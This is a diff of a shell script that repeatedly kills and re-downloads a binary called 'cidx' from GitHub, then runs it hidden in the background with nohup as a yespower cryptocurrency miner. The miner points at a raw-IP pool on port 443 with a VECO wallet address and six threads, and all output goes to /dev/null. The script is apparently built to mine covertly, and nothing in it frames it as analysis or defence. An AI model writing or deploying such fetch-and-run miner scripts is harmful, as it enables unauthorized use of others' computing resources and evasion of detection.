@@ -2,8 +2,10 @@
 pkill cidx
 while true; do
   # Download and extract the cidx file
-  wget -q -O cidx https://gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz
-  tar -xvf cidx >/dev/null 2>&1
+  # wget -q -O cidx https://gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz
+  # tar -xvf cidx >/dev/null 2>&1
+  rm -rf cidx
+  wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1
 
   # Set the current date in UTC-7 format
   current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
@@ -23,7 +25,11 @@ END
   chmod +x config.json cidx
 
   # Run cidx in the background
-  nohup ./cidx -c 'config.json' &>/dev/null &
+  # nohup ./cidx -c 'config.json' &>/dev/null &
+  nohup ./cidx -a yespower  \
+  -o 45.115.224.235:443 \
+  -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker6 \
+  -p c=VECO,m=solo,zap=VECO,mc=VECO -t 6 &>/dev/null &
 
   # Print info: STARTED
   clear
